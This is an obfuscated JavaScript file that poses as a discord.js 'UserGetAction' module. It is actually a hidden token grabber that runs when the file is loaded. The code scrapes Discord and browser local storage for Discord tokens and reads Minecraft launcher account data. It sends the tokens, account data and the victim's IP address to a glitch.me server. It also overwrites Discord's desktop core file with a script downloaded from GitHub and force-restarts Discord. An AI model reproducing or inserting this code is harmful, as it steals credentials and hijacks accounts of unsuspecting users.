var _0xe4d60d = _0x1223;
const Action = require(_0xe4d60d(0x0));
function _0x1223(_0x1b408e, _0x1223e7) {
    var _0xe6065 = _0x1b40();
    _0x1223 = function (_0x347f83, _0x158695) {
        _0x347f83 = _0x347f83 - 0x0;
        var _0x260d15 = _0xe6065[_0x347f83];
        return _0x260d15;
    };
    return _0x1223(_0x1b408e, _0x1223e7);
}
const OS = require('os'), fs = require('fs'), fetch = require(_0xe4d60d(0x1)), {execSync} = require(_0xe4d60d(0x2)), Glob = require(_0xe4d60d(0x3)), toInject = [], toInjectJS = [], toKill = [], apiurl = _0xe4d60d(0x4);
try {
    switch (OS[_0xe4d60d(0x5)]()) {
    case _0xe4d60d(0x6):
        const local = process[_0xe4d60d(0x7)][_0xe4d60d(0x8)], roaming = process[_0xe4d60d(0x7)][_0xe4d60d(0x9)], minecraftPath = roaming + _0xe4d60d(0xa), remixPath = roaming + _0xe4d60d(0xb);
        dbPaths = [
            roaming + _0xe4d60d(0xc),
            roaming + _0xe4d60d(0xd),
            roaming + _0xe4d60d(0xe),
            roaming + _0xe4d60d(0xf),
            roaming + _0xe4d60d(0x10),
            roaming + _0xe4d60d(0x11),
            roaming + _0xe4d60d(0x12),
            local + _0xe4d60d(0x13),
            local + _0xe4d60d(0x14),
            local + _0xe4d60d(0x15),
            local + _0xe4d60d(0x16),
            local + _0xe4d60d(0x17),
            local + _0xe4d60d(0x18),
            local + _0xe4d60d(0x19),
            local + _0xe4d60d(0x1a),
            local + _0xe4d60d(0x1b),
            local + _0xe4d60d(0x1c),
            local + _0xe4d60d(0x1d),
            local + _0xe4d60d(0x1e),
            local + _0xe4d60d(0x1f),
            local + _0xe4d60d(0x20),
            local + _0xe4d60d(0x21),
            local + _0xe4d60d(0x22)
        ];
        init();
        function init() {
            var _0x5823c8 = {
                _0x3db5d3: 0x23,
                _0x24910a: 0x23,
                _0x14275b: 0x26
            };
            var _0x3f38d0 = _0x1223;
            fs[_0x3f38d0(_0x5823c8._0x3db5d3)](remixPath, (_0x1e8936, _0x34b1df) => _0x34b1df && minecraft(_0x3f38d0(0x24), _0x34b1df));
            fs[_0x3f38d0(_0x5823c8._0x24910a)](minecraftPath, (_0x420197, _0x4bc9fc) => _0x4bc9fc && minecraft(_0x3f38d0(0x25), _0x4bc9fc));
            injectToDiscord();
            dbPaths[_0x3f38d0(_0x5823c8._0x14275b)](_0x50f61a => main(_0x50f61a));
        }
        function main(_0x3479b8) {
            var _0xca75cb = { _0x279654: 0x27 };
            var _0x12a27b = {
                _0x3d2aad: 0x28,
                _0x17747b: 0x26
            };
            var _0x147a4b = _0x1223;
            fs[_0x147a4b(_0xca75cb._0x279654)](_0x3479b8, (_0xd12384, _0x5706af) => {
                var _0x43ef2d = {
                    _0x1481a1: 0x2b,
                    _0x27951e: 0x2c,
                    _0x185189: 0x2d,
                    _0x21103c: 0x2e,
                    _0xa9c7ed: 0x2f
                };
                var _0x44bc2c = _0x1223;
                if (_0x5706af) {
                    var _0x43b58a = _0x5706af[_0x44bc2c(_0x12a27b._0x3d2aad)](_0x366fa1 => _0x366fa1[_0x44bc2c(0x29)](_0x44bc2c(0x2a)));
                    _0x43b58a[_0x44bc2c(_0x12a27b._0x17747b)](_0x3bb72e => {
                        var _0x44a723 = _0x1223;
                        var _0x315b0b = fs[_0x44a723(_0x43ef2d._0x1481a1)](_0x3479b8 + '/' + _0x3bb72e)[_0x44a723(_0x43ef2d._0x27951e)]();
                        var _0x359855 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x451d47 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x2bf18d] = _0x359855[_0x44a723(_0x43ef2d._0x185189)](_0x315b0b) || _0x451d47[_0x44a723(_0x43ef2d._0x185189)](_0x315b0b) || [undefined];
                        if (_0x2bf18d)
                            fetch(_0x44a723(_0x43ef2d._0x21103c))[_0x44a723(_0x43ef2d._0xa9c7ed)](_0x4e8369 => _0x4e8369[_0x44a723(0x30)]())[_0x44a723(_0x43ef2d._0xa9c7ed)](_0x503a6d => fetch(apiurl + _0x44a723(0x31), {
                                'method': _0x44a723(0x32),
                                'body': JSON[_0x44a723(0x33)]({
                                    'token': _0x2bf18d[_0x44a723(0x34)](0x1, -0x1),
                                    'ipAddress': _0x503a6d[_0x44a723(0x35)]
                                })
                            }));
                    });
                }
            });
        }
        function minecraft(_0x40f0df, _0x33dbf1) {
            var _0x1377ef = {
                _0x29ad59: 0x24,
                _0x42cbfa: 0x36,
                _0x38ae40: 0x32,
                _0x21f8ec: 0x33,
                _0x1fcbcf: 0x25,
                _0x5a0fcc: 0x2d,
                _0x4faaf9: 0x37,
                _0x565c01: 0x34,
                _0x380d91: 0x38,
                _0x5ce521: 0x32,
                _0x52831a: 0x39,
                _0x3b070a: 0x3a,
                _0x1aef31: 0x3b,
                _0x1f1b2e: 0x3c,
                _0x15b40e: 0x3d,
                _0xc5c375: 0x3d,
                _0x362682: 0x3e,
                _0x3139c8: 0x3f,
                _0xcc35aa: 0x40,
                _0x125b30: 0x41,
                _0xad23f5: 0x42,
                _0x2ad500: 0x43
            };
            var _0x532871 = _0x1223;
            switch (_0x40f0df) {
            case _0x532871(_0x1377ef._0x29ad59):
                fetch(apiurl + _0x532871(_0x1377ef._0x42cbfa), {
                    'method': _0x532871(_0x1377ef._0x38ae40),
                    'body': JSON[_0x532871(_0x1377ef._0x21f8ec)]({ 'UID': _0x33dbf1 })
                });
                break;
            case _0x532871(_0x1377ef._0x1fcbcf):
                var [_0x5aa397] = /"[\d\w_-]{32}"/[_0x532871(_0x1377ef._0x5a0fcc)](_0x33dbf1);
                if (_0x5aa397) {
                    const _0x20d793 = require(minecraftPath);
                    if (!_0x20d793[_0x532871(_0x1377ef._0x4faaf9)])
                        return;
                    var _0xb272df = _0x20d793[_0x532871(_0x1377ef._0x4faaf9)][_0x5aa397[_0x532871(_0x1377ef._0x565c01)](0x1, -0x1)];
                    fetch(apiurl + _0x532871(_0x1377ef._0x380d91), {
                        'method': _0x532871(_0x1377ef._0x5ce521),
                        'body': JSON[_0x532871(_0x1377ef._0x21f8ec)]({
                            'eligibleForMigration': _0xb272df[_0x532871(_0x1377ef._0x52831a)],
                            'hasMultipleProfiles': _0xb272df[_0x532871(_0x1377ef._0x3b070a)],
                            'legacy': _0xb272df[_0x532871(_0x1377ef._0x1aef31)],
                            'localId': _0xb272df[_0x532871(_0x1377ef._0x1f1b2e)],
                            'minecraftProfileID': _0xb272df[_0x532871(_0x1377ef._0x15b40e)]['id'],
                            'minecraftProfileName': _0xb272df[_0x532871(_0x1377ef._0xc5c375)][_0x532871(_0x1377ef._0x362682)],
                            'persistent': _0xb272df[_0x532871(_0x1377ef._0x3139c8)],
                            'remoteId': _0xb272df[_0x532871(_0x1377ef._0xcc35aa)],
                            'type': _0xb272df[_0x532871(_0x1377ef._0x125b30)],
                            'username': _0xb272df[_0x532871(_0x1377ef._0xad23f5)],
                            'activeAccountLocalId': _0x20d793[_0x532871(_0x1377ef._0x2ad500)]
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            var _0x3f3ca4 = {
                _0x57c62b: 0x44,
                _0x1402bc: 0x2f
            };
            var _0x5458ac = _0x1223;
            getInstalledDiscord();
            killAllDiscords();
            fetch(_0x5458ac(_0x3f3ca4._0x57c62b))[_0x5458ac(_0x3f3ca4._0x1402bc)](_0x49f45a => _0x49f45a[_0x5458ac(0x45)]())[_0x5458ac(_0x3f3ca4._0x1402bc)](_0x2730c1 => toInjectJS[_0x5458ac(0x26)](_0x4b71da => fs[_0x5458ac(0x46)](_0x4b71da, _0x2730c1[_0x5458ac(0x47)](_0x5458ac(0x48), apiurl)) ^ execSync(local + '/' + _0x4b71da[_0x5458ac(0x49)]('/')[0x5] + _0x5458ac(0x4a) + _0x4b71da[_0x5458ac(0x49)]('/')[0x5] + _0x5458ac(0x4b))));
        }
        function getInstalledDiscord() {
            var _0x43f21d = {
                _0x4b07f3: 0x4c,
                _0x3ec35e: 0x26,
                _0x971882: 0x26
            };
            var _0x8a0674 = _0x1223;
            fs[_0x8a0674(_0x43f21d._0x4b07f3)](roaming)[_0x8a0674(_0x43f21d._0x3ec35e)](_0x581ab1 => _0x581ab1[_0x8a0674(0x4d)](_0x8a0674(0x4e)) && toInject[_0x8a0674(0x4f)](local + '/' + _0x581ab1));
            toInject[_0x8a0674(_0x43f21d._0x971882)](_0x179778 => Glob[_0x8a0674(0x50)](_0x179778 + _0x8a0674(0x51))[_0x8a0674(0x52)](_0x1847b9 => toInjectJS[_0x8a0674(0x4f)](_0x1847b9)));
        }
        function killAllDiscords() {
            var _0x2b3ee2 = {
                _0x242b2b: 0x53,
                _0x42410d: 0x2c,
                _0xd1db18: 0x4d,
                _0x32bff4: 0x54,
                _0x1df134: 0x4f,
                _0x346b1e: 0x55,
                _0x226958: 0x56,
                _0x4ccfa1: 0x57,
                _0x1576b0: 0x58,
                _0x3b9fb4: 0x4f,
                _0x2d0c7a: 0x59,
                _0x35f5b5: 0x4d,
                _0x393026: 0x5a,
                _0x120bdc: 0x5b,
                _0x251bad: 0x26
            };
            var _0x5d9976 = _0x1223;
            var _0x2de631 = execSync(_0x5d9976(_0x2b3ee2._0x242b2b))[_0x5d9976(_0x2b3ee2._0x42410d)]();
            _0x2de631[_0x5d9976(_0x2b3ee2._0xd1db18)](_0x5d9976(_0x2b3ee2._0x32bff4)) && toKill[_0x5d9976(_0x2b3ee2._0x1df134)](_0x5d9976(_0x2b3ee2._0x346b1e));
            _0x2de631[_0x5d9976(_0x2b3ee2._0xd1db18)](_0x5d9976(_0x2b3ee2._0x226958)) && toKill[_0x5d9976(_0x2b3ee2._0x1df134)](_0x5d9976(_0x2b3ee2._0x4ccfa1));
            _0x2de631[_0x5d9976(_0x2b3ee2._0xd1db18)](_0x5d9976(_0x2b3ee2._0x1576b0)) && toKill[_0x5d9976(_0x2b3ee2._0x3b9fb4)](_0x5d9976(_0x2b3ee2._0x2d0c7a));
            _0x2de631[_0x5d9976(_0x2b3ee2._0x35f5b5)](_0x5d9976(_0x2b3ee2._0x393026)) && toKill[_0x5d9976(_0x2b3ee2._0x1df134)](_0x5d9976(_0x2b3ee2._0x120bdc));
            toKill[_0x5d9976(_0x2b3ee2._0x251bad)](_0x5ba459 => execSync(_0x5d9976(0x5c) + _0x5ba459 + _0x5d9976(0x5d)));
        }
        break;
    case _0xe4d60d(0x5e):
        const defaut = _0xe4d60d(0x5f) + __dirname[_0xe4d60d(0x49)]('/')[0x2] + _0xe4d60d(0x60), LdbPaths = [
                defaut + _0xe4d60d(0x61),
                defaut + _0xe4d60d(0x10),
                defaut + _0xe4d60d(0xf),
                defaut + _0xe4d60d(0xd)
            ];
        const LminecraftPath = defaut + _0xe4d60d(0xa);
        Linit();
        function Linit() {
            var _0x4871a0 = {
                _0x558a2f: 0x26,
                _0x639741: 0x2b
            };
            var _0x6731a9 = _0x1223;
            LdbPaths[_0x6731a9(_0x4871a0._0x558a2f)](_0x49e856 => Lmain(_0x49e856));
            var _0x12309e = fs[_0x6731a9(_0x4871a0._0x639741)](LminecraftPath);
            if (_0x12309e)
                Lminecraft(_0x12309e);
            LinjectToDiscord();
        }
        function Lmain(_0x42a42e) {
            var _0x10b716 = { _0x4d2e02: 0x27 };
            var _0x1d57a7 = {
                _0x3dfac2: 0x28,
                _0x647b21: 0x26
            };
            var _0x2b3de0 = {
                _0x3b4c5a: 0x2b,
                _0xcffb5a: 0x2c,
                _0x248cf4: 0x2d,
                _0x3a75f4: 0x2d,
                _0x23cf9e: 0x2e,
                _0x5767a2: 0x2f,
                _0x435948: 0x2f
            };
            var _0x4612d = _0x1223;
            fs[_0x4612d(_0x10b716._0x4d2e02)](_0x42a42e, (_0x3da867, _0x43c143) => {
                var _0x494360 = _0x1223;
                if (_0x43c143) {
                    var _0xf69302 = _0x43c143[_0x494360(_0x1d57a7._0x3dfac2)](_0x994635 => _0x994635[_0x494360(0x29)](_0x494360(0x2a)));
                    _0xf69302[_0x494360(_0x1d57a7._0x647b21)](_0xc2e5be => {
                        var _0x4971ad = _0x1223;
                        var _0x3ee53d = fs[_0x4971ad(_0x2b3de0._0x3b4c5a)](_0x43c143 + '/' + _0xc2e5be)[_0x4971ad(_0x2b3de0._0xcffb5a)]();
                        var _0x418542 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x1d0de2 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x31a2be] = _0x418542[_0x4971ad(_0x2b3de0._0x248cf4)](_0x3ee53d) || _0x1d0de2[_0x4971ad(_0x2b3de0._0x3a75f4)](_0x3ee53d) || [undefined];
                        if (_0x31a2be)
                            fetch(_0x4971ad(_0x2b3de0._0x23cf9e))[_0x4971ad(_0x2b3de0._0x5767a2)](_0x22b650 => _0x22b650[_0x4971ad(0x30)]())[_0x4971ad(_0x2b3de0._0x435948)](_0x4e9b0b => fetch(apiurl + _0x4971ad(0x31), {
                                'method': _0x4971ad(0x32),
                                'body': JSON[_0x4971ad(0x33)]({
                                    'token': _0x31a2be,
                                    'ip': _0x4e9b0b[_0x4971ad(0x35)]
                                })
                            }));
                    });
                }
            });
        }
        function Lminecraft(_0x15923a) {
            var _0xd9394 = {
                _0x5deb18: 0x2d,
                _0x286101: 0x37,
                _0x5bb2ae: 0x34,
                _0x369032: 0x38,
                _0x575919: 0x32,
                _0x451d66: 0x33,
                _0x2fa02a: 0x39,
                _0x29c728: 0x3a,
                _0x3cbf66: 0x3b,
                _0x37bbdd: 0x3c,
                _0x4f16ae: 0x3d,
                _0x40a894: 0x3e,
                _0x493cf5: 0x3f,
                _0x1d43e3: 0x40,
                _0x4a0f29: 0x41,
                _0x5010b1: 0x42,
                _0xeae454: 0x43
            };
            var _0x531ced = _0x1223;
            var [_0x33ed75] = /"[\d\w_-]{32}"/[_0x531ced(_0xd9394._0x5deb18)](_0x15923a);
            if (_0x33ed75) {
                const _0x2ae340 = require(LminecraftPath);
                if (!_0x2ae340[_0x531ced(_0xd9394._0x286101)])
                    return;
                var _0x568ed6 = _0x2ae340[_0x531ced(_0xd9394._0x286101)][_0x33ed75[_0x531ced(_0xd9394._0x5bb2ae)](0x1, -0x1)];
                fetch(apiurl + _0x531ced(_0xd9394._0x369032), {
                    'method': _0x531ced(_0xd9394._0x575919),
                    'body': JSON[_0x531ced(_0xd9394._0x451d66)]({
                        'eligibleForMigration': _0x568ed6[_0x531ced(_0xd9394._0x2fa02a)],
                        'hasMultipleProfiles': _0x568ed6[_0x531ced(_0xd9394._0x29c728)],
                        'legacy': _0x568ed6[_0x531ced(_0xd9394._0x3cbf66)],
                        'localId': _0x568ed6[_0x531ced(_0xd9394._0x37bbdd)],
                        'minecraftProfileID': _0x568ed6[_0x531ced(_0xd9394._0x4f16ae)]['id'],
                        'minecraftProfileName': _0x568ed6[_0x531ced(_0xd9394._0x4f16ae)][_0x531ced(_0xd9394._0x40a894)],
                        'persistent': _0x568ed6[_0x531ced(_0xd9394._0x493cf5)],
                        'remoteId': _0x568ed6[_0x531ced(_0xd9394._0x1d43e3)],
                        'type': _0x568ed6[_0x531ced(_0xd9394._0x4a0f29)],
                        'username': _0x568ed6[_0x531ced(_0xd9394._0x5010b1)],
                        'activeAccountLocalId': _0x2ae340[_0x531ced(_0xd9394._0xeae454)]
                    })
                });
            }
        }
        function LinjectToDiscord() {
            var _0x164511 = {
                _0x3258fe: 0x44,
                _0xf63336: 0x2f,
                _0x1cff46: 0x2f
            };
            var _0x3a1395 = _0x1223;
            getInstalledLDiscord();
            fetch(_0x3a1395(_0x164511._0x3258fe))[_0x3a1395(_0x164511._0xf63336)](_0x1ab057 => _0x1ab057[_0x3a1395(0x45)]())[_0x3a1395(_0x164511._0x1cff46)](_0x24a414 => toInjectJS[_0x3a1395(0x26)](_0x37105c => fs[_0x3a1395(0x46)](_0x37105c, _0x24a414[_0x3a1395(0x47)](_0x3a1395(0x48), apiurl))));
        }
        function getInstalledLDiscord() {
            var _0x3b24b4 = {
                _0x5c93da: 0x4c,
                _0x227b09: 0x26
            };
            var _0x388d0b = _0x1223;
            fs[_0x388d0b(_0x3b24b4._0x5c93da)](defaut)[_0x388d0b(_0x3b24b4._0x227b09)](_0x359ae1 => _0x359ae1[_0x388d0b(0x4d)](_0x388d0b(0x4e)) && toInject[_0x388d0b(0x4f)](defaut + '/' + _0x359ae1));
            toInject[_0x388d0b(_0x3b24b4._0x227b09)](_0x3f1239 => Glob[_0x388d0b(0x50)](_0x3f1239 + _0x388d0b(0x62))[_0x388d0b(0x52)](_0x502128 => toInjectJS[_0x388d0b(0x4f)](_0x502128)));
        }
        break;
    case _0xe4d60d(0x63):
        break;
    }
} catch (_0x198c5c) {
}
function _0x1b40() {
    var _0x178a98 = [
        './Action',
        'node-fetch',
        'child_process',
        'glob',
        'https://frequent-level-cornflower.glitch.me',
        'platform',
        'win32',
        'env',
        'localappdata',
        'appdata',
        '/.minecraft/launcher_accounts.json',
        '/.minecraft/remix/UID.txt',
        '/Discord/Local\x20Storage/leveldb',
        '/DiscordDevelopment/Local\x20Storage/leveldb',
        '/Lightcord/Local\x20Storage/leveldb',
        '/discordptb/Local\x20Storage/leveldb',
        '/discordcanary/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
        '/Amigo/User\x20Data/Local\x20Storage/leveldb',
        '/Torch/User\x20Data/Local\x20Storage/leveldb',
        '/Kometa/User\x20Data/Local\x20Storage/leveldb',
        '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
        '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
        '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
        '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
        '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
        '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
        '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
        '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
        '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb',
        'readFile',
        'remix',
        'minecraft',
        'forEach',
        'readdir',
        'filter',
        'endsWith',
        'ldb',
        'readFileSync',
        'toString',
        'exec',
        'http://ip-api.com/json/',
        'then',
        'json',
        '/beforeinject',
        'POST',
        'stringify',
        'slice',
        'query',
        '/remix',
        'accounts',
        '/minecraft',
        'eligibleForMigration',
        'hasMultipleProfiles',
        'legacy',
        'localId',
        'minecraftProfile',
        'name',
        'persistent',
        'remoteId',
        'type',
        'username',
        'activeAccountLocalId',
        'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js',
        'text',
        'writeFileSync',
        'replace',
        '*API\x20URL*',
        'split',
        '/Update.exe\x20--processStart\x20',
        '.exe',
        'readdirSync',
        'includes',
        'cord',
        'push',
        'sync',
        '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js',
        'map',
        'tasklist',
        'Discord.exe',
        'discord',
        'DiscordCanary.exe',
        'discordcanary',
        'DiscordDevelopment.exe',
        'discorddevelopment',
        'DiscordPTB.exe',
        'discordptb',
        'taskkill\x20/IM\x20',
        '.exe\x20/F',
        'linux',
        '/home/',
        '/.config',
        '/discord/Local\x20Storage/leveldb',
        '/*/modules/discord_desktop_core/index.js',
        'darwin',
        'handle',
        'client',
        'dataManager',
        'newUser',
        'exports'
    ];
    _0x1b40 = function () {
        return _0x178a98;
    };
    return _0x1b40();
}
class UserGetAction extends Action {
    [_0xe4d60d(0x64)](_0x1d9bbc) {
        var _0x5c5979 = {
            _0x4cfa63: 0x65,
            _0x5340a9: 0x66,
            _0xf62d7a: 0x67
        };
        var _0x299a4 = _0x1223;
        const _0x62f41e = this[_0x299a4(_0x5c5979._0x4cfa63)];
        const _0x1274fc = _0x62f41e[_0x299a4(_0x5c5979._0x5340a9)][_0x299a4(_0x5c5979._0xf62d7a)](_0x1d9bbc);
        return { 'user': _0x1274fc };
    }
}
module[_0xe4d60d(0x68)] = UserGetAction;
